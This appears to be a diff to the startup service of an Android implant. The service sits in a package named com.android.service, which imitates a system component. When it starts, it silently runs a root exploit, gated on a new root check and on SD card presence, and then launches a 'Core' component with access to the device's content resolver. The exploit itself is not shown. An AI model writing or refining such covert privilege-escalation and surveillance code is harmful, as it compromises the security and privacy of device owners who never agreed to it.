@@ -1,7 +1,6 @@
 package com.android.service;
 
 import java.io.File;
-import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
@@ -23,22 +22,12 @@ public class ServiceCore extends Service {
 
 	private Core core;
 	private String shellFile;
-
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see android.app.Service#onBind(android.content.Intent)
-	 */
+	
 	@Override
 	public IBinder onBind(Intent intent) {
 		return null;
 	}
 
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see android.app.Service#onCreate()
-	 */
 	@Override
 	public void onCreate() {
 		super.onCreate();
@@ -48,11 +37,6 @@ public class ServiceCore extends Service {
 		Status.setAppContext(getApplicationContext());
 	}
 
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see android.app.Service#onDestroy()
-	 */
 	@Override
 	public void onDestroy() {
 		super.onDestroy();
@@ -63,27 +47,23 @@ public class ServiceCore extends Service {
 		core = null;
 	}
 
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see android.app.Service#onStart(android.content.Intent, int)
-	 */
 	@Override
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
-
-		// Don't exploit if we have no SD card mounted
-		if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
-			Status.self().setRoot(root());
+		
+		if (checkRoot() == true) {
+			Status.self().setRoot(true);			
 		} else {
 			Status.self().setRoot(false);
+			
+			// Don't exploit if we have no SD card mounted
+			if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
+				Status.self().setRoot(root());
+			}
 		}
 
-		// Toast.makeText(this, "Service Started, starting thread",
-		// Toast.LENGTH_LONG).show();
-		core = new Core();
-
 		// Core starts
+		core = new Core();
 		core.Start(this.getResources(), getContentResolver());
 	}
 
